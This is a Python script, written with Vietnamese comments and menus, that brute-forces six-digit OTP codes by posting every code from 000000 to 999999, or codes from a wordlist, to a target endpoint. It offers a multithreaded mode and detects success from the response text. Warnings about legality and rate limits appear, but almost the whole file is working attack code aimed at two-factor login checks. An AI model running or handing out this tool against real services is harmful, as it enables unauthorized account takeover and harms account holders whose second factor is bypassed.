# otp_bruteforce.py - Tool thử tổ hợp mã 6 số OTP
# CHỈ DÙNG ĐỂ KIỂM TRA BẢO MẬT CỦA CHÍNH TÀI KHOẢN BẠN
# CHẠY TRÊN a-shell HOẶC TERMINAL

import time
import sys
import requests
import threading
from datetime import datetime

class OTPTester:
    def __init__(self):
        self.found = False
        self.attempts = 0
        self.start_time = 0
        self.results = []
        
    def log(self, msg):
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"[{timestamp}] {msg}")
        
    def test_otp(self, otp_code, target_url, param_name="otp"):
        """Gửi mã OTP đến trang đích để kiểm tra"""
        try:
            data = {param_name: f"{otp_code:06d}"}
            response = requests.post(target_url, data=data, timeout=2)
            
            # Kiểm tra phản hồi (tùy chỉnh theo từng trang)
            if "success" in response.text.lower() or "đăng nhập" in response.text:
                self.found = True
                return True
            return False
        except:
            return False
            
    def brute_force_sequential(self, target_url, start=0, end=999999, param="otp", delay=0.05):
        """Thử tuần tự từ 000000 đến 999999"""
        self.start_time = time.time()
        self.log(f"[+] BẮT ĐẦU THỬ TỔ HỢP 6 SỐ: {start} -> {end}")
        self.log(f"[+] Target: {target_url}")
        
        for otp in range(start, end + 1):
            if self.found:
                break
                
            self.attempts += 1
            code = f"{otp:06d}"
            
            if self.test_otp(code, target_url, param):
                self.log(f"[✓] TÌM THẤY MÃ OTP: {code}")
                self.log(f"[✓] Sau {self.attempts} lần thử trong {time.time() - self.start_time:.1f}s")
                return code
                
            # Hiển thị tiến trình
            if self.attempts % 1000 == 0:
                percent = (self.attempts / 1000000) * 100
                elapsed = time.time() - self.start_time
                rate = self.attempts / elapsed if elapsed > 0 else 0
                self.log(f"[*] Đã thử: {self.attempts}/{end-start+1} ({percent:.2f}%) - {rate:.0f} mã/giây")
                
            time.sleep(delay)
            
        self.log(f"[-] KHÔNG TÌM THẤY MÃ OTP trong {self.attempts} lần thử")
        return None
        
    def brute_force_threaded(self, target_url, threads=10, param="otp"):
        """Thử với nhiều luồng (nhanh hơn)"""
        self.log(f"[+] THỬ VỚI {threads} LUỒNG")
        
        chunk_size = 1000000 // threads
        thread_list = []
        
        for i in range(threads):
            start = i * chunk_size
            end = (i + 1) * chunk_size - 1 if i < threads - 1 else 999999
            t = threading.Thread(target=self.brute_force_sequential, 
                                args=(target_url, start, end, param, 0.01))
            thread_list.append(t)
            t.start()
            
        for t in thread_list:
            t.join()
            
    def show_menu(self):
        while True:
            print("\n" + "="*55)
            print("   TOOL KIỂM TRA OTP 6 SỐ")
            print("="*55)
            print("  [1] Thử tuần tự 000000 -> 999999")
            print("  [2] Thử với nhiều luồng (nhanh hơn)")
            print("  [3] Thử dải tùy chỉnh (VD: 123000 -> 123999)")
            print("  [4] Thử từ danh sách mã có sẵn (wordlist)")
            print("  [0] Thoát")
            print("="*55)
            print("  ⚠️  CHỈ DÙNG KIỂM TRA TÀI KHOẢN CỦA BẠN")
            print("="*55)
            
            choice = input("\n[>] Chọn: ").strip()
            
            if choice == "1":
                url = input("  URL gửi mã OTP (endpoint): ").strip()
                param = input("  Tên tham số OTP (mặc định: otp): ").strip() or "otp"
                delay = float(input("  Delay giữa các lần thử (0.01-1s): ") or "0.05")
                
                if url:
                    self.brute_force_sequential(url, 0, 999999, param, delay)
                input("\n[*] Enter để tiếp tục...")
                
            elif choice == "2":
                url = input("  URL gửi mã OTP: ").strip()
                threads = int(input("  Số luồng (5-50): ") or "10")
                param = input("  Tên tham số OTP (mặc định: otp): ").strip() or "otp"
                
                if url:
                    self.brute_force_threaded(url, threads, param)
                input("\n[*] Enter để tiếp tục...")
                
            elif choice == "3":
                url = input("  URL gửi mã OTP: ").strip()
                start = int(input("  Bắt đầu từ (VD: 123000): ").strip())
                end = int(input("  Kết thúc (VD: 123999): ").strip())
                param = input("  Tên tham số OTP: ").strip() or "otp"
                
                if url and start >= 0 and end <= 999999:
                    self.brute_force_sequential(url, start, end, param, 0.05)
                input("\n[*] Enter để tiếp tục...")
                
            elif choice == "4":
                wordlist_path = input("  Đường dẫn file wordlist (mỗi dòng 1 mã): ").strip()
                url = input("  URL gửi mã OTP: ").strip()
                param = input("  Tên tham số OTP: ").strip() or "otp"
                
                if wordlist_path and url:
                    try:
                        with open(wordlist_path, 'r') as f:
                            codes = [line.strip() for line in f if line.strip()]
                        
                        self.start_time = time.time()
                        for idx, code in enumerate(codes):
                            if self.found:
                                break
                            self.attempts += 1
                            if self.test_otp(code, url, param):
                                self.log(f"[✓] TÌM THẤY OTP: {code}")
                                break
                            if (idx + 1) % 100 == 0:
                                self.log(f"[*] Đã thử: {idx+1}/{len(codes)}")
                            time.sleep(0.05)
                    except FileNotFoundError:
                        print(f"[!] Không tìm thấy file: {wordlist_path}")
                input("\n[*] Enter để tiếp tục...")
                
            elif choice == "0":
                print("\n[+] Thoát tool")
                break
                
            else:
                print("[!] Chọn sai")

def warning():
    print("""
    ⚠️  CẢNH BÁO QUAN TRỌNG ⚠️
    - Tool này CHỈ dùng để kiểm tra bảo mật tài khoản của CHÍNH BẠN
    - Thử OTP trên tài khoản người khác là BẤT HỢP PHÁP
    - Hầu hết các trang đều có giới hạn số lần thử sai (5-10 lần)
    - Thực tế: KHÔNG THỂ brute force OTP 6 số do:
      + Thời gian: 1 triệu mã * 0.05s = 14 giờ
      + Giới hạn tốc độ (rate limiting)
      + Khóa tài khoản sau 5-10 lần sai
    """)
    
if __name__ == "__main__":
    print("""
    ╔══════════════════════════════════════╗
    ║   TOOL KIỂM TRA OTP 6 SỐ (TEST)     ║
    ║   CHỈ DÙNG CHO MỤC ĐÍCH HỌC TẬP     ║
    ╚══════════════════════════════════════╝
    """)
    warning()
    input("[*] Nhấn Enter nếu bạn đã hiểu rủi ro và chỉ dùng cho tài khoản của mình...")
    
    tester = OTPTester()
    tester.show_menu()
